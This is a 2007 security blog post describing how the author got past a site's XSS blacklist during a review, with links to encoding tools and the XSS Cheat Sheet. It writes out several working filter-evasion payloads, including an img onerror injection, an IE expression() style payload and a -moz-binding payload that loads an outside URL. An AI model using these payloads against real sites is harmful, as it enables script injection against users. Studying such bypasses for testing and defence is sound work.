author: Marcin
disqus_id: 3f2d1246-c6fb-4992-9035-c24b7d629b0b
disqus_url: http://www.tssci-security.com/archives/2007/11/15/blacklisting-xss-filter-evasion-and-other-resources/
mod_date: 2007-11-16 08:19:06
parent: 0
post_id: 330
post_type: post
pub_date: 2007-11-15 22:52:29
public: 'yes'
slug: blacklisting-xss-filter-evasion-and-other-resources
tags:
- security
template: post.html
title: Blacklisting, XSS filter evasion and other resources

Blacklisting, XSS filter evasion and other resources
####################################################

So the other day I was doing a web site review and looking for XSS
issues. I came across one ASP form that used various URL parameters to
make up parts of the form. Well, I poked around and and tried injecting
the usual, ``<script>alert('xss')</script>``. The page went straight to
a 404 Not Found, so it must have been doing some kind of filtering. I
tried using various cases of ``<script>`` and also UTF-8 encoding the
script.

Nothing was working here, so I put in ``<scrpt>`` and the page worked,
and I saw the tag was being inserted into the page. The page was doing
filtering on the word script, so I knew I had to work around it somehow.
What I ended up doing, was injecting an image tag that pointed to
nothing, and an onerror event. Like so:

``<img src="" onerror=alert(/xss/)>``

And viola! XSS within five minutes. This was a pretty simple case, and
the blacklist was not comprehensive at all, but it just goes to show
there will always be ways around a filter. Also, be sure to use more
than just a single browser when testing web applications for security
flaws. Not every attack will work on Firefox and IE. Take the following
that I used against a search page for IE only:

``</XSS/*-*/STYLE=xss:e/**/xpression(alert(1337))>``

On another page, "onerror" was being filtered, so I had to work around
that. I needed something a little better, so I skipped the image and
script tags, and went straight to the input tags. I ended up using:

``" style="-moz-binding:url('http://h4k.in/')>``

This brings me to a couple new resources I came across, thanks to .mario
in `#slackers <irc://irc.irchighway.net>`_ IRC channel. During the
development and ongoing testing of the `PHP-IDS
project <http://php-ids.org/>`_, mario wrote this awesome `PHP Charset
Encoder <http://h4k.in/encoding/index.php>`_. This `interesting
thread <http://sla.ckers.org/forum/read.php?3,16741,16741#msg-16741>`_
came up in our discussion as well, which is pretty cool and could be
used in evading filters. If
`RTL <http://www.i18nguy.com/markup/right-to-left.html>`_ looks familiar
to you, like it did to me... Perhaps you've seen RSnake's weird "`Dolce
& Gabanna <http://ha.ckers.org/weird/dandb.html>`_\ " page? Right click
> View source and take a look at some of the tags, one of them is RTL.
Now to decipher the rest of that HTML code. hahaha. Oh, one last thing
to wrap this post up... Don't forget the `XSS Cheat
Sheet <http://ha.ckers.org/xss.html>`_, also available in
`XML <http://ha.ckers.org/xssAttacks.xml>`_ for use in your own scripts.
It's been really useful these past couple days.
